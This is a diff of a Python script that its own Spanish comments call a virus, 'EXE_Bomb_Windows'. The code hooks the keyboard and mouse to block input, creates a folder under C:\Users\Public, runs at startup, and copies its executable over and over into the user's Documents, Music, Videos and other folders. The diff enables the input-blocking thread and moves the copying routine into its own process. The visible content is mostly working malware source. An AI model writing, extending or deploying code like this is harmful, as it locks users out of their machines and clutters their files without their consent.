@@ -45,7 +45,7 @@ def Block():            # Lib [KeyandMouse_Block]
         k.KeyAll = e
         k.HookKeyboard()
         pythoncom.PumpMessages()    # Bloquea Teclado
-def CreateFileMain():   #
+def CreateFileMain():   # Crea carpeta que contiene el virus
         try:  # Intenta crear la dirección 
             os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres')
             return True
@@ -58,7 +58,7 @@ def AutoCopy():
     nameKey     = "EXE_Bomb_Windows" # Nombre del virus
     user        = str(getuser())
     path        = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+nameKey+".exe"   # Segunda iniciada, esto debe existir
-    can  = 32    # Números de caracteres del nombre del virus
+    can  = 64    # Números de caracteres del nombre del virus
     documentos  = 'C:\\Users\\'+user+'\\Documents'
     music       = 'C:\\Users\\'+user+'\\Music'
     video       = 'C:\\Users\\'+user+'\\Videos'
@@ -145,9 +145,10 @@ def AutoCopy():
     
     #inicia Hilo
     CreateFolder() 
-    for x in range(150):    #Cambiar por un while(True)
+    for x in range(2):    #Cambiar por un while(True)
+        print("for pe")
+        """ # Copia
         CopyDoc()
-        """
         CopyMus()
         CopyVic()
         CopyPic()
@@ -179,8 +180,9 @@ if __name__ == '__main__':
         print("se creó la carpeta y startup exitoso, virus deshabilitado")
         exit()
     else:                   # Solo se ejecuta si la PC ya está infectada
-        #block= threading.Thread(target=Block)   # Bloquea Teclado y mouse
-        autocopy= threading.Thread(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+        block = threading.Thread(target=Block)   # Bloquea Teclado y mouse
+        autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+        
         
         #block.start()
         autocopy.start()         
@@ -204,5 +206,5 @@ if __name__ == '__main__':
         
         #p1.join()
         #p2.join()
-        print("la carpeta ya existe, virus en acción")
+        print("la carpeta ya existe, \nvirus en acción")
 
